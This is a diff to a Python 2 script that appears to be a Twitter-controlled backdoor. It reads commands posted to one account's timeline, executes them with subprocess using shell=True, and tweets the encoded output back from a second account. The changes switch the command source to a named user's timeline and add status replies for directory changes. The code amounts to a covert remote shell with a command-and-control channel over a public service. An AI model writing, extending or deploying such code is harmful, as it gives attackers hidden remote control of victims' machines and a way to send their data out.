@@ -29,23 +29,30 @@ apiTwo = tweepy.API(auth)
 
 
 
-
 def limit():
 	data = api.rate_limit_status()
-	value = str(data['resources']['statuses']['/statuses/home_timeline'])
-	almost = value[-3:]
-	remain= almost[:2]
-	print str(remain) + " API calls remaining" 
-	if( int(remain) == 0):
-		print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
-		sleep(15*61)
+	value = str(data['resources']['statuses']['/statuses/user_timeline'])
+	if (len(value) == 55):
+		almost = value[-3:]
+		remain= almost[:2]
+		print str(remain) + " API calls remaining" 
+		if( int(remain) == 4):
+			print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
+			sleep(15*61)
+	else:
+		almost = value[-4:]
+		remain= almost[:3]
+		print str(remain) + " API calls remaining" 
+		if( int(remain) == 4):
+			print "Sleeping for 15 minutes. Maually delete tweets from Twitter pages."
+			sleep(15*61)	
 
 
 def listen():
 	
 	public_tweets = None
 	while(not public_tweets):
-		public_tweets = api.home_timeline()
+		public_tweets = api.user_timeline('PhoenixKrazyKat')
 		limit()
 		
 		if public_tweets:
@@ -60,6 +67,9 @@ def listen():
 				if mess[:2] == "cd":
 					os.chdir(mess[3:])
 					print "Directory changed."
+					result = "Directory Changed." 
+					enResult = encode(result)
+					apiTwo.update_status(enResult)
 				else:
 					response = subprocess.check_output(mess, shell=True)
 					enResponse = encode(response)
